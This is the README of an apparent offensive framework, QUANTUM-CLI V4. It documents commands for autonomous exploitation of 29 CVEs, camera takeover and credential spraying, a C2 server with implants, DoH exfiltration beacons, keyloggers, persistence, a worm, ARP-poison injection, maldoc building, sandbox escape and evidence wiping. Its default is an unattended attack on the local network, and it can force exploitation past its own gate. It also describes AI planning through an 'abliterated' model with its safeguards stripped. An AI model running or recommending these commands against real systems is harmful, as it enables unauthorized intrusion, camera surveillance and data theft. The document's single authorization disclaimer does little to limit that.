# QUANTUM-CLI V4

**Autonomous, authorized-engagement offensive framework with NSA-TAO-parity techniques.**

QUANTUM-CLI V4 is the package revision of the V3.1 single-file spec (`quantum_cli.py`, archived at
`dist/quantum-cli-v3.1-single.py`). One launcher, one importable package (`src/quantum/`), one goal:
run a complete authorized engagement — recon to sealed loot to MITRE report — with camera-first
autonomy and a production-grade C2.

> **Authorized engagements only.** QUANTUM-CLI is built for penetration tests, security labs, and
> engagements with written authorization. Point it only at networks you are contracted to test.

## Highlights (NSA-TAO-parity techniques)

| Capability | What it does |
|---|---|
| **29-CVE weapon registry** | Tiered `ZERO_DAY_REGISTRY` (legacy / V3_HIGH / V3_MED / V3_CHECK) with a fire contract (`registry.fire(cve, ip)`) and AI- or QBrain-planned auto-exploit. |
| **Camera warfare (CAMWAR)** | TCP + WS-Discovery camera discovery, vendor fingerprinting (Hikvision, Dahua, Axis, Foscam, TP-Link, generic), credential spray, snapshot + PTZ control. |
| **Autonomous Overlord** | Full engagement loop with no operator input: camera-first sweep, recon, validator-gated exploitation, post-exploit staging, harvest, sealing, MITRE mapping. |
| **Production WSGI C2 + kill-switch** | Waitress-served Flask C2 on `:8443` (gunicorn fallback, Flask dev last resort) with a covert kill-switch (`POST /kill`) that wipes and retires every beaconing implant. |
| **DoH egress agents (GHOSTFANG-DNS)** | POSIX agents whose beacons ride public DoH resolvers (443/tcp) as base32 subdomain labels — no inbound ports, tasking via DNS TXT records. |
| **PolyMorph v3** | Per-beacon epoch-keyed HMAC keystreams, UTF-7 variants, and junk filler — identical plaintexts never produce identical wire bytes. |
| **GRAYFISH sealed loot** | All loot sealed at rest with AES-256-GCM (`.gfy` files); the sealing key at `logs/.lootkey` is created once and is immutable. |
| **EMOJISMS covert channel** | Emoji-encoding covert channel (`emoji` command) for steganographic message passing. |

## Quick start

```bash
# 1. Install (Python 3.9+)
pip install flask requests waitress pycryptodome impacket pysmb colorama

# 2. Optional: AI planning via Abliterated.ai (else QBrain deterministic fallback)
echo ABLITERATION_KEY=your-key-here > .env

# 3. Run fully autonomous (camera-first) on the autodetected local /24
python quantum_cli.py
```

No arguments = fully autonomous, camera-first. The Overlord starts the C2 on `:8443`, sweeps the
scope for cameras, then loops recon → validate → plan → fire → post-exploit → harvest → seal →
MITRE map. `Ctrl-C` at any time seals loot and exits cleanly.

## Usage — every CLI command

The single launcher `quantum_cli.py` (delegates to `python -m quantum`) takes an optional direct
command. With no command and no `--menu`, it runs the Autonomous Overlord.

### Global flags

| Flag | Meaning |
|---|---|
| `--menu` | Open the manual console (option-driven, includes camera console `c`). |
| `--scope`, `-c <CIDR>` | Autonomous/scan scope. |
| `--target`, `-t <IP/CIDR>` | External target — runs camera war on it **autonomously by default** (add `--manual` for the manual camera console). A bare IP is expanded to its `/24`. |
| `--manual` | With `--target`: manual camera console instead of autonomous. |
| `--camera-only` | Restrict autonomous mode to camera operations. |
| `--no-ai` | Fully deterministic (QBrain) — no AI prompts, no model downloads, no network to AI providers. |
| `--cycles <N>` | Autonomous cycle cap (0 = infinite). |
| `--aggression balanced\|aggressive\|patient` | Autonomous posture (aggressive forces exploitation past the validator). |
| `--model <id>` | Pin the AI model (overrides adaptive selection; also `QCLI_PINNED_MODEL`). |
| `--kill` | Arm the kill-switch against a live C2 via `POST /kill`. |
| `--domain <domain>` | Operator-controlled domain for DoH egress beacons (`ghostdns`). |
| `-g`, `--gateway` | Gateway IP for QUANTUM insert. |
| `--iface` | Network interface. |
| `--peer <onion>` | Federation peer `.onion` to sync. |
| `-dc-ip`, `-dc-name`, `-d` | Domain-controller parameters (`zerologon`). |
| `-f`, `--file` | Input file (`pcap`). |
| `--force` | Force exploitation past the validator gate (`auto`, `keygen`). |

### Command examples

```bash
# C2 / NETWORK
python quantum_cli.py serve                     # production WSGI C2 on :8443 (waitress)
python quantum_cli.py federation                # start federation hidden service -> {"onion": ...}
python quantum_cli.py federation --peer <peer-onion>   # merge a peer's implant registry
python quantum_cli.py posixagent               # generate the POSIX agent (ghostfang.sh); -t to pin host
python quantum_cli.py ghostdns --domain ops.example.tld   # GHOSTFANG-DNS DoH egress agent + task check

# CAMERA WARFARE
python quantum_cli.py camwar -c 10.0.0.0/24    # discover + attack + control every camera in scope
python quantum_cli.py camshot -t 10.0.0.42      # one-shot single camera (auto identify/attack/snapshot)

# RECON / PROBE
python quantum_cli.py zerocheck -t 10.0.0.42   # 9-probe battery: log4shell, citrixbleed, citrix path,
                                                 #   PAN-OS, Confluence OGNL, WebLogic, IOS XE, vCenter, MOVEit
python quantum_cli.py recon -t 10.0.0.42        # fingerprint
python quantum_cli.py osint -t example.com       # OSINT lookup
python quantum_cli.py validator -t 10.0.0.42    # target-value scoring (exploit gate)

# EXPLOITATION
python quantum_cli.py auto -t 10.0.0.42         # validator-gated auto-exploit (add --force to skip gate)
python quantum_cli.py brute -t 10.0.0.42        # credential spray
python quantum_cli.py phish -t user@example.com  # phish engine

# POST-EXPLOIT / IMPLANT OPS
python quantum_cli.py keylog                     # stage the keylogger (delivered on next beacon)
python quantum_cli.py persist                    # stage persistence (PERSISTX)
python quantum_cli.py wipe                       # footprint wipe (Windows or POSIX, per host OS)
python quantum_cli.py seal                        # seal all loot (GRAYFISH)
python quantum_cli.py unseal                     # unseal all loot

# TECHNIQUES
python quantum_cli.py mshtmaldoc                # build the MSHTML maldoc (CVE-2021-40444)
python quantum_cli.py flashfill                  # FlashFill staged-fill technique
python quantum_cli.py cagebreak                  # escape the (macOS) sandbox cage
python quantum_cli.py macreset                   # generate the macOS recovery-reset script
python quantum_cli.py emoji                       # EMOJISMS: encode a message into emoji, verify decode

# AI / OPSEC / REPORTING
python quantum_cli.py deployai                   # deploy the local AI model into models/
python quantum_cli.py keygen                      # (re)generate implant crypto keys; --force overwrites
python quantum_cli.py mitre                      # regenerate logs/mitre_map.json from the audit log
python quantum_cli.py --menu                     # manual console (all of the above, menu-driven)

# AUTONOMOUS MODES
python quantum_cli.py                            # fully autonomous, camera-first, local /24
python quantum_cli.py --no-ai --cycles 5         # deterministic (QBrain), 5 cycles, no AI calls
python quantum_cli.py --target 203.0.113.0/24    # external network: autonomous camera war by default
python quantum_cli.py --target 203.0.113.7 --manual   # same, but manual camera console
```

### Remaining direct commands

| Command | Purpose |
|---|---|
| `foxacid` | FOXACID watering-hole server on `:8081`. |
| `quantum -t <ip> -g <gw>` | QUANTUM insert (ARP poison + inject). |
| `dohc2` | DoH C2 beacon server on `:5353`. |
| `icmp` | Switchboard ICMP covert-channel listener (20 s). |
| `trinity` | Trinity memory capture. |
| `cams -c <cidr>` | Discover + attack + control cameras (verbose step-through). |
| `wifi` | Somberknight wireless sweep. |
| `triage` | Wildfire triage. |
| `mfp` | MFP persistence. |
| `pcap -f <file>` | PCAP analysis. |
| `router -t <ip>` | UnitedDrake router attack. |
| `worm -t <ip>` | GODSUPREME worm hop. |
| `episcribe [-t <sel>]` | EpiScribe watch (300 s) with optional selector. |
| `cottonmouth [-t <ip>]` | CottonMouth payload staging. |
| `tor` | Ensure Tor is up (OPSEC). |
| `zerologon -dc-ip <ip> -dc-name <name> -d <dom>` | Zerologon dump. |

## Repo layout

```
quantum-cli/
├── quantum_cli.py                # single-entry launcher (delegates to src/quantum)
├── src/quantum/                  # the V4 package — split of the V3.1 single-file spec
│   ├── core/                     # env/paths, audit log + MITRE mapper, opsec, GRAYFISH, QBrain, deps
│   ├── ai/                       # AI_Supervisor (Abliterated.ai primary) + local model bootstrap
│   ├── recon/                    # scan, fingerprint/Validator, OSINT, DoH, WS-Discovery/ONVIF
│   ├── camwar/                   # CAMWAR engine, vendor tables, RTSP, brute/phish v3
│   ├── weapons/                  # 29-CVE registry, kernel/remote/media/legacy tiers, PolyMorph,
│   │   │                         #   techniques (cagebreak, flashfill, macreset, emojisms)
│   │   └── ...
│   ├── postexploit/              # persistx, kitlogger, killswitch, harvest, footprint
│   ├── c2/                       # Flask app + routes, waitress WSGI, transports, agents (ghostfang, ghostdns)
│   ├── overlord/                 # AutonomousOverlord, decide policy, engagement engines
│   └── dash/                     # live ops dashboard (served at /dash)
├── agents/build/variant.py       # deterministic per-target OBSIDIAN agent variant builder
├── agents/build/out/             # generated variant stagers (obsidian_<ip>_e<epoch>_<tag>.ps1)
├── exploit_payloads/             # staged exploit payloads (built alongside the framework)
├── tests/                        # pytest suite (registry, polymorph, emoji, variant)
├── dist/quantum-cli-v3.1-single.py   # archived single-file V3.1 spec (reference)
├── single-script/                # legacy single-file reference copy
├── qcli/                         # runtime: keys/, obsidian.ps1, ghostfang.sh, ghostdns.sh
├── logs/                         # audit.jsonl, decisions.jsonl, mitre_map.json, .lootkey (immutable!)
├── loot/                         # sealed loot (*.gfy)
├── models/                       # local AI models
└── docs/                         # WIKI, OPERATOR_MANUAL, TROUBLESHOOTING, HOWTOs
```

## Testing

```bash
pytest tests/
```

The suite covers the weapon registry fire contract, PolyMorph v3 round-trips and epoch/junk
diversification, the EMOJISMS codec, and variant-builder determinism (same target+epoch is
byte-identical; different epochs differ bytewise).

## Release artifacts

- `dist/quantum-cli-v3.1-single.py` — the archived single-file V3.1 build (THE SPEC).
- `agents/build/out/` — generated OBSIDIAN stager variants.

## Documentation

- [docs/WIKI.md](docs/WIKI.md) — architecture, module map, MITRE mapping, C2 REST API reference.
- [docs/OPERATOR_MANUAL.md](docs/OPERATOR_MANUAL.md) — step-by-step operator runbook.
- [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) — symptom → fix table.
- [docs/HOWTOs.md](docs/HOWTOs.md) — in-depth guides (autonomous runs, DoH exfil, variants, registry).

## License

MIT License. See the license header in `quantum_cli.py`.

## Links

- Repository: <https://github.com/projectzerodays>
